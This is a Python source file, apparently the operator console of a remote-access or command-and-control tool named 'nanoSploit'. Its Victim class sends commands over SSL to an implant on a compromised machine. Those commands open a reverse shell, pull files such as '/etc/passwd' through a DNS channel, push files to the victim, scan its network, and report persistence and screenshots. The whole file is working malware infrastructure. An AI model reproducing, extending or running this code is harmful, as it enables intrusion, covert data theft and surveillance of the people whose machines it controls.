import ssl


class Victim:
    _id: str
    conn: ssl.SSLSocket
    ip: str
    port: int
    system: str
    commands: dict

    def __init__(self, client_id: str, conn: ssl.SSLSocket, addr: tuple, system: str):
        self._id = client_id
        self.conn = conn
        self.ip = addr[0]
        self.port = addr[1]
        self.system = system
        self.commands = {
            "ping": self.__ping,
            "shell": self.__shell,
            "download": self.__download,
            "upload": self.__upload,
            "scan": self.__scan,
            "persistence": self.__persistence,
            "screenshot": self.__screenshot
        }

    def __screenshot(self):
        self.conn.send(b"screenshot")
        buffer = self.conn.recv()
        if buffer:
            print(buffer.decode())
            return True
        else:
            return False

    def __upload(self) -> bool:
        src_path = input("Source path : ")
        dst_path = input("Destination path on remote host : ")

        if src_path and dst_path:
            # Read file
            with open(src_path, "rb") as f:
                content = f.read()

            # Split content into chunks
            chunks = []
            max_length = 253
            for i in range(0, len(content), max_length):
                split = content[i:i + max_length]
                chunks.append(split)

            # Tell the DNS server what to send
            from nanosploit.dns import dns_handler
            dns_handler.chunks = chunks

            # Tell client to start receiving file
            self.conn.send(b"receive "+dst_path.encode())
            print("Waiting for victim to receive file...")

            # Wait client to finish
            buffer = self.conn.recv()

            # Reset DNS parameters
            dns_handler.chunks = None

            if buffer:
                if buffer == b"ok":
                    print(f"Successfully uploaded '{src_path}'")
                else:
                    print("Error while receiving file")
            else:
                # Lost connection
                return False
        else:
            print("Enter corrects paths !")
        return True

    def __persistence(self) -> bool:
        self.conn.send(b"persistence")
        buffer = self.conn.recv()
        if buffer:
            # Print persistence status
            print(buffer.decode())
            return True
        else:
            return False

    def __ping(self) -> bool:
        self.conn.send(b"ping")
        buffer = self.conn.recv()
        if buffer:
            print(buffer.decode())
            return True
        else:
            return False

    def __shell(self) -> bool:
        # Tell client to enter shell mode
        self.conn.send(b"shell")

        exit_flag = True
        while exit_flag:
            # Get 'user:cwd' for prompt
            prompt = self.conn.recv().decode()

            while True:
                cmd = input(f"{prompt} $ ")
                if cmd == "exit":
                    self.conn.send(cmd.encode())
                    exit_flag = False
                    break
                elif cmd:
                    self.conn.send(cmd.encode())
                    buffer = self.conn.recv()
                    print(buffer.decode())
                    break
        return True

    def __download(self):
        src_path = input("Source path on remote host (ex: '/etc/passwd') : ")
        if src_path:
            # Ask victim if remote file exists
            self.conn.send(b"exists "+src_path.encode())
            buffer = self.conn.recv()
            if buffer:
                if buffer == b"ok":
                    # File exists on remote host

                    filename = src_path.split("/")[-1]

                    # Tell the DNS server where to write file
                    from nanosploit.dns import dns_handler
                    dns_handler.filename = filename

                    # Tell victim to start sending file
                    self.conn.send(b"send " + src_path.encode())
                    print("Waiting for victim to send file...")

                    # Waiting victim to finish
                    buffer = self.conn.recv()

                    # Reset DNS server
                    dns_handler.filename = None

                    if buffer:
                        if buffer == b"ok":
                            print(f"Successfully downloaded to '{filename}'")
                        else:
                            print("Error while sending file")
                    else:
                        # Lost victim connection
                        return False
                else:
                    print("Error: file doesn't exist or is not a file")
            else:
                # Lost victim connection
                return False
        else:
            print("Error: enter a correct file name")
        return True

    def __scan(self):
        target = input("Target IP or Network (ex: 192.168.1.0/24) : ")
        if target:
            self.conn.send(b"scan "+target.encode())
            print("Waiting for scan result...")
            buffer = self.conn.recv()
            if buffer:
                print("\nScan result :\n")
                print(buffer.decode())
            else:
                # Lost connection
                return False
        else:
            print("Enter a correct target !")
        return True

    def enter_shell(self) -> bool:
        while True:
            cmd: str = input(f"\033[4mnanoSploit\033[0m ({self._id}) > ")

            if cmd:
                cmd1 = cmd.split(" ")[0]
                match cmd1:
                    case cmd1 if cmd1 in ("exit", "quit", "q"):
                        # Exit client selection without closing connection
                        break
                    case "close":
                        # Exit client selection and closing connection
                        self.conn.close()
                        return False
                    case "help":
                        print("""
help\t\t- Print this message
ping\t\t- Check if client is still active
shell\t\t- Enter reverse shell
scan\t\t- Start a network scan
persistence\t- Show persistence status
download\t- Download a file from remote client
upload\t\t- Upload a file to remote client
""")
                    case cmd1 if cmd1 in self.commands.keys():
                        if not self.commands[cmd1]():
                            # If False then lost connection
                            self.conn.close()
                            return False
                    case _:
                        print(f"Unknown command : '{cmd}'")
        return True

    def __str__(self):
        return f"{self.ip}:{self.port}\t{self.system}"
